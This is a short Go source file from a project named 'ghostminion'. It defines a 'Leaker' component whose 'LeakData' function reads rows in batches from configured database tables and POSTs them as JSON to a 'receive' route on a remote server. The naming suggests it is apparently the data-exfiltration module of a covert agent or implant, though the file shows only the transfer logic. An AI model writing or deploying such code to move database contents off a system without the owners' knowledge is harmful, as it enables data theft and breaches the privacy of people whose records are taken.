package communication

import (
	"encoding/json"
	"ghostminion/config"
	"ghostminion/db"
)

type Leaker struct {
	tables       []db.TableConfig
	serverConfig config.ServerConfig
}

func NewLeaker(tables []db.TableConfig, serverConfig config.ServerConfig) *Leaker {
	return &Leaker{tables: tables, serverConfig: serverConfig}
}

func (l *Leaker) LeakData() error {

	for _, table := range l.tables {
		for {
			rows, err := db.FetchRows(table)
			if err != nil {
				return err
			}
			if len(rows) == 0 {
				break
			}
			err = l.sendData(rows)
			if err != nil {
				return err
			}

			if len(rows) < table.BatchSize {
				break
			}
		}
	}

	return nil
}

func (l *Leaker) sendData(data any) error {
	payload, err := json.Marshal(data)
	if err != nil {
		return err
	}
	_, _, err = SendRequest(
		POST,
		CreateRoute(l.serverConfig, "receive"),
		map[string]string{},
		payload,
	)
	if err != nil {
		return err
	}
	return nil
}
